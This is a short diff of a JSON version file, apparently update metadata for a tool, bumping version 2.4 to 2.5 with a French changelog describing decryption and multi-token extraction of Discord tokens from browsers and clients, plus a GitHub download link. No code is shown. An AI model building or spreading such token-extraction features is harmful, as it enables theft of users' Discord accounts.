@@ -1,5 +1,6 @@
 {
-  "version": "2.4",
-  "changelog": "v2.4: Décryptage universel des tokens Discord depuis tous les navigateurs et clients",
+  "version": "2.5",
+  "changelog": "v2.5: Extraction multi-tokens Discord, parallélisation haute performance du scan et masquage des données sensibles Super Admin",
   "download_url": "https://github.com/AdamZoda/ANTI/releases"
 }
+
